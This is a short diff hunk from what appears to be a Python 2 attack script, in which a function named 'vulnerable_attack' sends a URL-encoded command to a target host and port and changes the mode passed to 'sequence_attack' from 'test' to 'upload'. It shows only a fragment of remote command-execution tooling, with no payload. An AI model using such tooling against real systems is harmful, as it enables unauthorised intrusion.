@@ -19,7 +19,7 @@ def vulnerable_attack(target,target_port,cmd):
     try:	   
         print "cmd => " + cmd
         cmd = urllib.quote(cmd)
-	res = sequence_attack(target,target_port,cmd,'test',4)	 
+	res = sequence_attack(target,target_port,cmd,'upload',2)	 
     except Exception,e:
 	debug_print(traceback.format_exc())	
         dump_error("attack failed",target,"vulnerable attack")
